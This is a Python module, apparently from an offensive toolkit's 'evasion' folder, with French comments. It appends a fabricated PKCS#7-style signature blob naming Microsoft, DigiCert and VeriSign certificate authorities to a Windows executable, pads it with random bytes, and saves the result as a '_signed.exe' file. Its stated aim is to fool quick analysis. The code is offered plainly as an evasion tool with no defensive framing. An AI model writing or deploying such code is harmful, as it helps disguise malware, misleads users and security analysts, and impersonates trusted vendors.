# modules/evasion/signature_spoofer.py
import os
import struct

class SignatureSpoofer:
    def __init__(self):
        self.fake_signatures = [
            b'Microsoft Code Signing PCA',
            b'DigiCert SHA2 Assured ID Code Signing CA',
            b'VeriSign Class 3 Code Signing 2010 CA'
        ]
        
    def inject_fake_signature(self, pe_path):
        """Injecte une fausse signature pour tromper l'analyse rapide"""
        try:
            with open(pe_path, 'rb') as f:
                pe_data = bytearray(f.read())
                
            # Ajout d'une section factice avec signature
            fake_sig_data = self._create_fake_signature()
            
            # Insertion à la fin du fichier
            pe_data.extend(fake_sig_data)
            
            output_path = pe_path.replace('.exe', '_signed.exe')
            with open(output_path, 'wb') as f:
                f.write(pe_data)
                
            return output_path
            
        except Exception as e:
            print(f"Signature spoofing failed: {e}")
            return pe_path
            
    def _create_fake_signature(self):
        """Crée une fausse signature plausible"""
        # Structure PKCS#7 simplifiée (non fonctionnelle mais plausible)
        fake_sig = b'\x30\x82'  # SEQUENCE
        fake_sig += struct.pack('>H', 1024)  # Taille
        fake_sig += b'\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02'  # OID signedData
        fake_sig += b'\xA0\x82' + struct.pack('>H', 1000)  # Context specific
        fake_sig += b'\x30\x82' + struct.pack('>H', 996)   # Inner SEQUENCE
        fake_sig += b'\x02\x01\x01'  # Version
        fake_sig += b'\x31\x00'      # Empty SET (digestAlgorithms)
        fake_sig += b'\x30\x0B'      # contentInfo
        fake_sig += b'\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x01'  # OID data
        
        # Remplissage avec des données aléatoires
        fake_sig += os.urandom(900)
        
        return fake_sig
